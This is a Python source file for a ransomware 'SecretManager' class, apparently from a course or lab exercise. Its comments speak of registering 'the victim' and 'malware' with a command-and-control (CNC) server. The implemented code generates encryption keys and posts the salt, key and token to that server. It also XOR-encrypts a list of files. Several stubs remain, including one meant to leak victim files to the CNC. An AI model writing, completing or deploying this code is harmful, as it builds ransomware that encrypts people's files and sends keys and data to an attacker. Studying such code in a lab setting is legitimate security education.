from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Derive a key from the salt and the key

        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
            backend=default_backend()
        )
        return kdf.derive(key)


    def create(self) -> Tuple[bytes, bytes, bytes]:
        # Generate salt, key, and token
        salt = os.urandom(self.SALT_LENGTH)
        key = os.urandom(self.KEY_LENGTH)
        token = os.urandom(self.TOKEN_LENGTH)

        return salt, key, token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

 
    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        url = f"http://{self._remote_host_port}/new"
        data = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
        }
        response = requests.post(url, json=data)

        if response.status_code != 200:
            self._log.error(f"Failed to send data to CNC: {response.text}")
        else:
            self._log.info("Data sent to CNC successfully")
    def setup(self) -> None:
        # Main function to create crypto data and register malware to CNC

        # Create the cryptographic elements: salt, key, and token
        self._salt = os.urandom(self.SALT_LENGTH)
        self._key = os.urandom(self.KEY_LENGTH)
        self._token = os.urandom(self.TOKEN_LENGTH)

        # Save the salt and token to local files
        os.makedirs(self._path, exist_ok=True)
        with open(os.path.join(self._path, "salt.bin"), "wb") as salt_file:
            salt_file.write(self._salt)
        with open(os.path.join(self._path, "token.bin"), "wb") as token_file:
            token_file.write(self._token)

        # Register the victim to the CNC by sending the data
        self.post_new(self._salt, self._key, self._token)


    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self) -> str:
        # Return a string composed of hex symbols, regarding the token
        hashed_token = sha256(self._token).hexdigest()
        return hashed_token



    def xorfiles(self, files: List[str]) -> None:
        # XOR a list of files using the self._key
        for file_path in files:
            try:
                xorfile(file_path, self._key)
            except Exception as e:
                self._log.error(f"Error encrypting file {file_path}: {e}")

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()